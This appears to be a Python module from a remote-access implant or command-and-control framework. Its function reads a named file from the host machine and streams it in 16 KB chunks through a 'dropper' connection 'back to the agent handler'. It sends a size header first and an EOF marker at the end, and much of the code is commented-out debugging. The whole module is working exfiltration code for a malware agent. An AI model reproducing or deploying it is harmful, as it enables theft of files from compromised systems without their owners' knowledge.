import os
from gzip import compress as gzipup
from base64 import b64encode

import time

def main(dropper, args=None):
    """Open a file and send its contents back to the agent handler"""

    print("Downloading : {}".format(args))
    rd_sz = 16384   # 16 times more htan before!
    if os.path.exists(args):
        #size = os.path.getsize(args)
        size = os.path.getsize(args)
        with open(args, 'rb') as t:
        #t = open(args, 'rb').read()

            #f = gzipup(t.read())
            #f = b64encode(f)
            #size = len(t)
            packet = 'BSFSIZE ' + str(size)
            print("DEBUG - {} : {}".format(packet,size))
            packet = packet.encode()
            i = 0
            tot_bytes = 0
            last_completion = 0
            completion = 0
            while len(packet) > 0:
                #dropper.resp = b64encode(packet).decode()

                #if len(packet) < 100:
                #    print("SEnding back {}".format(packet))
                #    print("SEnding back as {}".format(dropper.resp))
                dropper.send(packet)
                #if i == 0:
                #    print("DEBUG - sleeping")
                #    time.sleep(0.001)   #Let that file size work it's way over
                #print("SEnt")
                #packet = f.read(1024)
                #packet = f[i*rd_sz:i*rd_sz+rd_sz]
                #packet = b64encode(gzipup(t.read(rd_sz)))
                packet = t.read(rd_sz)
                i +=1
                #Print sometimes
                #completion = round((i*1024*10)/size, 0)
                tot_bytes += len(packet)
                completion = (tot_bytes/size)*100
                #print("complete : {}\n Last complete: {}".format(completion, last_completion))
                if round(completion,0) - round(last_completion,0) >= 1.0:
                    #print("{}% downloaded.".format(int(round(completion, 0))))
                    print("{}% downloaded.\r".format(int(round(completion, 0))), end="")
                last_completion = completion
                #if len(packet) < 100:
                #    time.sleep(1)   # Does this fix the concatenation?
            dropper.send('<BSEOF>')
        #t.close()
        #print("BSEOF!!!")
    else:
        print("DEBUG - File not found!")
        dropper.send('ERROR - File not found')
